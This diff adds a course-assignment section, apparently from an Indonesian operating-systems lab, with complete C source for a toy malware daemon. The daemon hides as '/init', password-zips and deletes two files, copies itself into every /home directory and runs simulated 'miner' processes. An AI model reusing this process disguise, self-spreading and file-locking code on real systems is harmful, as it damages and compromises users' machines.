@@ -1291,7 +1291,288 @@ gcc starterkit.c -o starterkit -lcurl -lzip
 ![Gmbr6](./assets/Soal_2/shutdown.png)
 ![Gmbr7](./assets/Soal_2/activityLog.png)
 ## Soal 3
+### Ringkasan soal
 
+Soal ini mengharuskan kita membuat sebuah malware. Malware ini berkerja secara daemon dan meyembunyikan diri dengan nama /init. Malware nya juga memiliki 3 fitur utama yang harus di implementasikan. 3 fitur ini adalah:
+
+1. Encryptor: Dengan menggunakan nama 'wannacryptor' fitur ini akan mengenkripsi file dan folder di direktori saat ini dengang menggunakan XOR dan timestamp. Karena kelompok kita adalah genap, metode yang kita gunakan adalah metode zip.
+2. Penyebaran Malware: Dengan menggunakan nama 'trojan.wrm' fitur ini akan menyebarkan malware ini ke semua direktori di home.
+3. Fork Bomb + Cryptomining: Dengan menggunakan nama 'rodok.exe' fitur ini akan melaksanakan fork bomb dengan proses yang bernama mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0). Setiap fork akan generate hash 64 char acak setiap 3–30 detik (Cryptomining). Hash disimpan di /tmp/.miner.log dengan format:
+```
+[YYYY-MM-DD hh:mm:ss][Miner XX] hash
+```
+
+* Fitur 1 dan 2 harus dijalankan berulang setiap 30 detik.
+* Jika rodok.exe dimatikan, maka mine-crafter-xx juga harus ikut berhenti.
+
+## **Fungsi Pembuatan Child Process**
+
+```c
+void spawn_child(const char *name) {
+    char shname[100];
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("fork child gagal");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid == 0) {
+        prctl(PR_SET_PDEATHSIG, SIGTERM);
+        int count;
+        sprintf(shname,"ps -ef | grep %s | grep -v root | grep -v grep | wc -l", name);
+        FILE *fp = popen(shname, "r");
+        fscanf(fp, "%d", &count);
+        fclose(fp);
+        if(count == 0) {
+           execl("/proc/self/exe", name, NULL); // re-execute diri sendiri dengan nama berbeda
+           perror("execl gagal");
+           exit(EXIT_FAILURE);
+        }
+    }
+}
+```
+Di dalam fungsi ini membuat child process dengan fork(). Di setiap child process ia akan:
+* Mengatur sinyal terminasi dengan prctl()
+* Memeriksa apakah proses dengan nama yang diberikan sudah ada
+* Jika tidak ada proses yang ditemukan, mengeksekusi ulang dirinya sendiri dengan nama baru menggunakan /proc/self/exe
+
+Setelah itu, kita bisa memasuki kode untuk komponen utama nya yaitu 3 fitur yang di miliki malware.
+
+## **Komponen Utama**
+### 1. wannacryptor
+
+```c
+int main(int argc, char *argv[]) {
+    char minecrafter[100];
+    char hashgen[200];
+
+    if (strcmp(argv[0], "wannacryptor") == 0) {
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        while (1) {
+            // Encryption
+            system("zip -r -m -P pass haha.zip apa randomtext.txt>/dev/null"); // password: pass
+            sleep(30);
+        }
+    } else
+```
+Setiap 30 detik proses ini akan mengenkripsi folder 'apa' dan file 'randomtext.txt'. Mereka akan dimasuki kedalam file zip yang bernama 'haha.zip' dan di enkripsi dengan password 'pass'. Proses ini lumayan bahaya jadi kita hanya mengisolasikan proses nya kepada dua file ini.
+
+### 2. trojan.wrm
+
+```c
+if (strcmp(argv[0], "trojan.wrm") == 0) {
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        while (1) {
+            // Trojan
+            system("find /home -type d -exec cp malware {}/ \\;"); // copy ke semua directory di home
+            sleep(30);
+        }
+    } else
+```
+Setiap 30 detik proses ini akan selalu menyebarkan salin dirinya sendiri kepada semua direktori di home.
+
+### 3. rodok.exe
+
+```c
+    if (strcmp(argv[0], "rodok.exe") == 0) {
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        // rodok.exe akan buat 5 anak lagi
+        for(int i=0; i < 5; i++) {
+                sprintf(minecrafter,"mine-crafter-%i",i);
+                spawn_child(minecrafter);
+        }
+        wait(NULL);
+        while(1) {
+            sleep(30);
+        }
+    } else
+
+    if(strncmp(argv[0], "mine-crafter-", 13) == 0) {
+        char *substr = &argv[0][13];
+        srand(time(NULL));
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        while(1) {
+                sprintf(hashgen,"echo \"[$(date +\"%%Y-%%m-%%d %%H:%%M:%%S\")] [MINER %i] $(openssl rand -base64 32 | sha256sum | awk '{print $1}')\" >> /tmp/.miner.log",atoi(substr));
+                system(hashgen);
+                sleep(rand() % 28 + 3);
+        }
+   }
+```
+Proses ini akan membuat 5 fork yang bernama mine-crafter-0 sampai mine-crafter-4. Setiap mine-crafter-XX akan generate hash hexadecimal (base 16) random sepanjang 64 char. Setiap hash akan generate secara random setiap 3 detik - 30 detik. Setiap hasil generate akan disimpan di /tmp/.miner.log
+
+## **Inisialisasi Proses Utama**
+```c
+// Proses utama: buat proses /init
+   pid_t pid = fork();
+   if (pid < 0) {
+        perror("fork gagal");
+        exit(EXIT_FAILURE);
+   }
+   if (pid == 0) {
+        // Proses /init
+        prctl(PR_SET_NAME, "/init", 0, 0, 0);
+        strncpy(argv[0], "/init", strlen(argv[0]));
+        argv[0][5] = 0;
+
+        spawn_child("wannacryptor");
+        spawn_child("trojan.wrm");
+        spawn_child("rodok.exe");
+
+        for (int i = 0; i < 3; i++) {
+              wait(NULL);
+        }
+   } else {
+        // Proses induk utama keluar
+        exit(EXIT_SUCCESS);
+   }
+   return 0;
+}
+```
+
+Ini adalah proses utama, proses yang membuat /init dan child process 'wannacryptor', 'trojan.wrm', dan 'rodok.exe'.
+
+## **Code lengkap:**
+```c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <signal.h>
+#include <errno.h>
+#include <sys/wait.h>
+#include <time.h>
+
+void spawn_child(const char *name) {
+    char shname[100];
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("fork child gagal");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid == 0) {
+        prctl(PR_SET_PDEATHSIG, SIGTERM);
+        int count;
+        sprintf(shname,"ps -ef | grep %s | grep -v root | grep -v grep | wc -l", name);
+        FILE *fp = popen(shname, "r");
+        fscanf(fp, "%d", &count);
+        fclose(fp);
+        if(count == 0) {
+           execl("/proc/self/exe", name, NULL); // re-execute diri sendiri dengan nama berbeda
+           perror("execl gagal");
+           exit(EXIT_FAILURE);
+        }
+    }
+}
+
+int main(int argc, char *argv[]) {
+    char minecrafter[100];
+    char hashgen[200];
+
+    if (strcmp(argv[0], "wannacryptor") == 0) {
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        while (1) {
+            // Encryption
+            system("zip -r -m -P pass haha.zip apa randomtext.txt>/dev/null"); // password: pass
+            sleep(30);
+        }
+    } else
+
+   if (strcmp(argv[0], "trojan.wrm") == 0) {
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        while (1) {
+            // Trojan
+            system("find /home -type d -exec cp malware {}/ \\;"); // copy ke semua directory di home
+            sleep(30);
+        }
+    } else
+
+
+    if (strcmp(argv[0], "rodok.exe") == 0) {
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        // rodok.exe akan buat 5 anak lagi
+        for(int i=0; i < 5; i++) {
+                sprintf(minecrafter,"mine-crafter-%i",i);
+                spawn_child(minecrafter);
+        }
+        wait(NULL);
+        while(1) {
+            sleep(30);
+        }
+    } else
+
+    if(strncmp(argv[0], "mine-crafter-", 13) == 0) {
+        char *substr = &argv[0][13];
+        srand(time(NULL));
+        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
+        while(1) {
+                sprintf(hashgen,"echo \"[$(date +\"%%Y-%%m-%%d %%H:%%M:%%S\")] [MINER %i] $(openssl rand -base64 32 | sha256sum | awk '{print $1}')\" >> /tmp/.miner.log",atoi(substr));
+                system(hashgen);
+                sleep(rand() % 28 + 3);
+        }
+   }
+
+   // Proses utama: buat proses /init
+   pid_t pid = fork();
+   if (pid < 0) {
+        perror("fork gagal");
+        exit(EXIT_FAILURE);
+   }
+   if (pid == 0) {
+        // Proses /init
+        prctl(PR_SET_NAME, "/init", 0, 0, 0);
+        strncpy(argv[0], "/init", strlen(argv[0]));
+        argv[0][5] = 0;
+
+        spawn_child("wannacryptor");
+        spawn_child("trojan.wrm");
+        spawn_child("rodok.exe");
+
+        for (int i = 0; i < 3; i++) {
+              wait(NULL);
+        }
+   } else {
+        // Proses induk utama keluar
+        exit(EXIT_SUCCESS);
+   }
+   return 0;
+}
+```
+Untuk di jalankan, pertama gunakan ini dahulu:
+```
+gcc malware.c -o malware
+```
+Kita gunakan nama malware untuk output executable nya, bisa juga digantikan dengan nama 'runme'
+
+Jalankan dengan:
+```
+./malware
+```
+Saat sudah di jalankan, jika di lihat bagi ps aux atau ps axjf, akan melihatkan struktur proses seperti:
+```
+\_ /init
+    \_ wannacryptor
+    \_ trojan.wrm
+    \_ rodok.exe
+        \_ mine-crafter-0
+        \_ mine-crafter-1
+        \_ mine-crafter-2
+        \_ mine-crafter-3
+        \_ mine-crafter-4
+```
+Untuk melihat langsung yang di generate oleh rodok.exe dan mine-crafter-XX. gunakan:
+```
+tail -f /tmp/.miner.log
+```
+* Jika ingin mematikan malware nya, bisa di kill langsung dengan menggunakan PID nya /init.
+* Jika ingin membersihkan malware yang diseluruh direktori home, gunakan:
+```
+find /home -type d -exec rm -f {}/malware \;
+```
+* Jika ingin extract yang di enkripsi oleh zip, gunakan password 'pass'.
 
 ## Soal 4
 ### Ringkasan Latar Belakang Soal
